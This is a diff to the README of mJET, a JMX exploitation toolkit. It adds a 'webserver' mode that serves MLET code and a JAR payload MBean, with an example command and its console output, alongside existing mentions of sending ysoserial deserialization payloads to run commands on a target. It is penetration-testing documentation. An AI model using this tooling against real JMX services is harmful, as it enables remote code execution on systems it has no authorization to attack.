@@ -45,8 +45,11 @@ Where
 * **deserialize** - send a ysoserial payload to the target
   * *gadget* - gadget as provided by ysoserial, e.g., CommonsCollections6
   * *cmd* - command to be executed
+ * **webserver** - just run the MLET web server
+  * *payload_url* - full URL to load the payload
+  * *payload_port* - port to load the payload
 
-## Example
+## Examples
 
 
 ### Installing the payload MBean on a vulnerable JMX service
@@ -244,6 +247,19 @@ mJET - MOGWAI LABS JMX Exploitation Toolkit
 [+] Loaded sun.management.ManagementFactoryHelper$PlatformLoggingImpl
 [+] Added ysoserial API capacities
 [+] Deploying object
+```
+
+### Webserver only mode
+
+It is also possible to just run the web server that provides the MLET code and the JAR file with the payload MBean
+```
+h0ng10@rocksteady ~/w/mjet> jython mjet.py 10.165.188.23 2222 webserver http:/xxxx/xxxx 8000
+
+MJET - MOGWAI LABS JMX Exploitation Toolkit
+===========================================
+[+] Starting webserver at port 8000
+[+] Press Enter to stop the service
+
 ```
 
 ## Contributing
